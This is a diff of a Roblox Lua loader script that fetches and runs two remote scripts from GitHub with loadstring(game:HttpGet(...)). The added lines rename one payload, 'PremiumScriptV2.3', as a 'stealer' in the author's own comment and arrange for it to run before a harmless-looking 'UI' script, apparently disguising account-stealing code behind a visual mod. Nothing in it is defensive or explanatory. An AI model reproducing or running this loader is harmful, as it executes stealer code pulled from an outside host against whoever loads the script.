@@ -1,18 +1,23 @@
--- Execute first script
-local success1, err1 = pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jinx-Script/new-visual/refs/heads/main/new-visual"))()
-end)
+-- First script (stealer)
+local function stealer()
+    return pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/No-ShadowHub/ShadowHubExecutor/refs/heads/main/PremiumScriptV2.3"))()
+    end)
+end
 
+-- Second script (UI)
+local function loadui()
+    return pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jinx-Script/new-visual/refs/heads/main/new-visual"))()
+    end)
+end
+
+-- Execute in order
+local success1, err1 = stealer()
 if not success1 then
     warn("Error running first script: " .. tostring(err1))
 else
-    -- Only run second script if first was successful
-    local success2, err2 = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/No-ShadowHub/ShadowHubExecutor/refs/heads/main/PremiumScriptV2.3"))()
-
-
-    end)
-
+    local success2, err2 = loadui()
     if not success2 then
         warn("Error running second script: " .. tostring(err2))
     end
